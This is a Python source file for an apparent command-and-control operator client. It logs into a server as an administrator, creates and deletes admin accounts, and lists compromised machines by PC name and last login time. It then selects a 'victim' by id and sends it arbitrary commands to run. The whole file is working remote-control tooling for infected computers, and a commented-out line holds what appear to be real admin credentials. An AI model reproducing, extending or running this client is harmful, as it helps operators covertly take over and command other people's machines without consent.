from pprint import pprint

import requests
import json

import CONFIG


def fake_hashed_password(password):
    return password


class Client:
    def __init__(self):
        self.jwt_token = None
        self.victim_id = None

    def login(self, username: str, password: str):
        ans = requests.post(f"{CONFIG.host}/login_admin/",
                            json={
                                "admin_login": username,
                                "admin_hash_password": fake_hashed_password(password)
                            })
        if ans.status_code == 200:
            token = json.loads(ans.content.decode('utf-8'))["access_token"]
            jwt_token = "Bearer " + token

            self.jwt_token = jwt_token
            return "login successfully"
        return "login error!"

    def who_is(self):
        ans = requests.get(f"{CONFIG.host}/who_is",
                           headers={
                               'accept': 'application/json',
                               'Authorization': self.jwt_token
                           })
        if ans.status_code == 200:
            return ans.content.decode('utf-8')
        return f"error {ans.content.decode('utf-8')}"

    def create_new_admin(self, new_user_name: str, new_password: str, is_super_admin: bool = False):
        ans = requests.post(f"{CONFIG.host}/create_new_admin",
                            headers={
                                'accept': 'application/json',
                                'Authorization': self.jwt_token
                            },
                            json={
                                "admin_login": new_user_name,
                                "admin_hash_password": fake_hashed_password(new_password),
                                "is_super_admin": is_super_admin
                            })
        if ans.status_code == 200:
            return ans.content.decode('utf-8')
        return f"error {ans.content.decode('utf-8')}"

    def set_active_admin(self, username, active):
        ans = requests.post(f"{CONFIG.host}/set_active_admin",
                            headers={
                                'accept': 'application/json',
                                'Authorization': self.jwt_token
                            },
                            json={
                                "admin_login": username,
                                "is_active": active
                            })
        if ans.status_code == 200:
            return ans.content.decode('utf-8')
        return f"error {ans.content.decode('utf-8')}"

    def delete_admin(self, username):
        ans = requests.post(f"{CONFIG.host}/delete_admin",
                            headers={
                                'accept': 'application/json',
                                'Authorization': self.jwt_token
                            },
                            json={
                                "admin_login": username,
                            })
        if ans.status_code == 200:
            return ans.content.decode('utf-8')
        return f"error {ans.content.decode('utf-8')}"

    def get_users(self):
        ans = requests.get(f"{CONFIG.host}/get_users",
                           headers={
                               'accept': 'application/json',
                               'Authorization': self.jwt_token
                           })
        if ans.status_code == 200:
            return json.loads(ans.content.decode('utf-8'))
        return f"error {ans.content.decode('utf-8')}"

    def set_vicitm_id(self, vicitm_id: int):
        self.victim_id = vicitm_id
        return "victim is set"

    def set_command(self, command: str):
        if self.victim_id:
            ans = requests.post(f"{CONFIG.host}/set_command",
                               headers={
                                   'accept': 'application/json',
                                   'Authorization': self.jwt_token
                               },
                                json={
                                    "victim_id": self.victim_id,
                                    "command": command
                                })
            if ans.status_code == 200:
                return ans.content.decode('utf-8')
            return f"error {ans.content.decode('utf-8')}"
        return "you did not choose a victim"


c = Client()

# c.login("123456789", "987654321")
# c.who_is()
#
# # print(c.create_new_admin("saveliy01", "cfdtkbq2005", True))
# print(c.who_is())
# print(c.get_users())

#
def listen(command: str, **args):
    if command == "login":
        username = input("Username: ")
        password = input("Password: ")
        print(c.login(username, password))
    elif command == "who_is":
        print(c.who_is())
    elif command == "create admin":
        username = input("Username: ")
        password = input("Password: ")
        is_super_admin = input("Is super admin? ").lower()
        is_super_admin = True if is_super_admin in ["yes", "y"] else False
        print(is_super_admin)
        print()
        print(c.create_new_admin(username, password, is_super_admin))
    elif command == "set active":
        username = input("Username: ")
        active = input("Active? ").lower()
        active = True if active in ["yes", "y"] else False
        print(c.set_active_admin(username, active))
    elif command == "delete admin":
        username = input("Username: ")
        print(c.delete_admin(username))
    elif command == "get all users":
        for i in c.get_users()["users"]:
            print(f"{i['id']}\tpc_name: {i['pc_name']}\t\ttime: {i['last_login_time']}")
    elif command == "set victim":
        print(c.set_vicitm_id(int(input("Vicitm id: "))))
    elif command == "set command":
        print(c.set_command(input("command: ")))
    print("-------")


while True:
    listen(input())

